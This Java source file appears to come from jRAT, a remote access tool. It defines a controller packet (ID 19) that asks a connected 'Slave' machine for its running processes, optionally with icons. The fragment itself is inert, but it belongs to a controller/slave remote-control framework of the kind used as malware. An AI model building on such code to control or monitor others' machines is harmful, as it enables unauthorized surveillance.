package jrat.module.process;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.AbstractOutgoingPacket;


public class PacketQueryProcesses extends AbstractOutgoingPacket {
	
	private boolean icons;
	
	public PacketQueryProcesses() {
		this(false);
	}
	
	public PacketQueryProcesses(boolean icons) {
		this.icons = icons;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeBoolean(icons);
	}

	@Override
	public short getPacketId() {
		return 19;
	}

}
